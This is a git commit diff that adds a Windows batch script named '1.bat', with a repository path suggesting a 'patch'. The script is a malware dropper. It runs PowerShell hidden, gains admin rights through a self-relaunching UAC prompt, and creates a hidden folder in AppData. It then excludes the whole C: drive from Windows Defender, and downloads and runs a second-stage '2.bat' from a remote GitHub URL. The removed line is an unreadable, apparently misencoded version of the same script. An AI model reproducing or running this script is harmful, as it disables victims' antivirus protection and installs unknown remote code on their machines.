5c1185007fc073762d3325d77a13896e4b434e5d
xstrong <167684811+xst4@users.noreply.github.com>
2024-05-02 23:32:11 +0300

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,1 +1,37 @@
-਍汣൳ഊ䀊捥潨漠晦਍਍潰敷獲敨汬ⴠ楷摮睯栠摩敤⁮挭浯慭摮∠ഢ †䤠⁆┢剐䍏卅体归剁䡃呉䍅啔䕒∥䔠啑∠浡㙤∴⠠਍渾汵㈠☾‱┢奓呓䵅佒呏尥祓坳坏㐶捜捡獬攮數•┢奓呓䵅佒呏尥祓坳坏㐶捜湯楦屧祳瑳浥ഢ⤊䔠卌⁅ന㸊畮⁬㸲ㄦ∠匥卙䕔前住╔獜獹整㍭尲慣汣⹳硥≥∠匥卙䕔前住╔獜獹整㍭尲潣普杩獜獹整≭਍ഩഊ椊⁦┧牥潲汲癥汥✥丠充✠✰⠠਍††潧潴唠䍁牐浯瑰਍ 汥敳⠠朠瑯⁯潧䅴浤湩⤠਍਍唺䍁牐浯瑰਍††捥潨匠瑥唠䍁㴠䌠敲瑡佥橢捥年∨桓汥⹬灁汰捩瑡潩≮⥞㸠∠琥浥╰杜瑥摡業⹮扶≳਍††敳⁴慰慲獭‽⨥਍††捥潨唠䍁匮敨汬硅捥瑵⁥挢摭攮數Ⱒ∠振∠┢獾∰•瀥牡浡㩳㴢∢∥‬∢‬爢湵獡Ⱒㄠ㸠‾┢整灭尥敧慴浤湩瘮獢਍਍††┢整灭尥敧慴浤湩瘮獢ഢ †搠汥∠琥浥╰杜瑥摡業⹮扶≳਍††硥瑩⼠ൂഊ㨊潧䅴浤湩਍††異桳⁤┢䑃∥਍††䑃⼠⁄┢摾ばഢഊ挊⁤䌢尺獕牥屳唥䕓乒䵁╅䅜灰慄慴䱜捯污ഢ洊摫物∠湁湯ഢ愊瑴楲⁢栫∠湁湯•猯⼠൤ഊ瀊睯牥桳汥⹬硥⁥挭浯慭摮∠摁ⵤ灍牐晥牥湥散ⴠ硅汣獵潩偮瑡⁨䌢尺਍਍潐敷獲敨汬ⴠ潃浭湡⁤䤢癮歯ⵥ敗牢煥敵瑳✠瑨灴㩳⼯楧桴扵挮浯砯瑳⼴慰捴ㅨ爯睡洯楡⽮⸲慢❴ⴠ畏䙴汩⁥㩃啜敳獲╜单剅䅎䕍尥灁䑰瑡屡潌慣屬湁湯㉜戮瑡ഢ挊⁤㩃啜敳獲╜单剅䅎䕍尥灁䑰瑡屡潌慣屬湁湯ഢ猊慴瑲㈠戮瑡
+cls
+
+@echo off
+
+powershell -window hidden -command ""
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+cd "C:\Users\%USERNAME%\AppData\Local"
+mkdir "Anon"
+attrib +h "Anon" /s /d
+
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
+
+Powershell -Command "Invoke-Webrequest 'https://github.com/xst4/patch1/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
+cd C:\Users\%USERNAME%\AppData\Local\Anon"
+start 2.bat
